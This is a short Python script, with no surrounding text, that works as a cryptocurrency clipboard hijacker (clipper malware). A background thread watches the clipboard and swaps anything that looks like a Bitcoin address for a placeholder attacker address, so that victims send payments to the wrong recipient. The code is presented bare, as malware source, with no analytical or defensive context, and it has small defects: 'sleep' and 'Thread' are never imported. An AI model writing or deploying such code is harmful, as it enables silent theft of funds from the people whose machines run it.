from clipboard import paste, copy
btc_address = "$BTC_ADDRESS"
def btc_changer(btc_address):
    while 1:
        sleep(.100)
        clipb = paste()
        if len(clipb) <= 35 and len(clipb) >= 26:
            if clipb.startswith("1") or clipb.startswith("3") and " " not in clipb and "O" not in clipb and "I" not in clipb and "l" not in clipb and "0" not in clipb:
                copy(btc_address)
Thread(target=btc_changer, args=(btc_address,)).start()
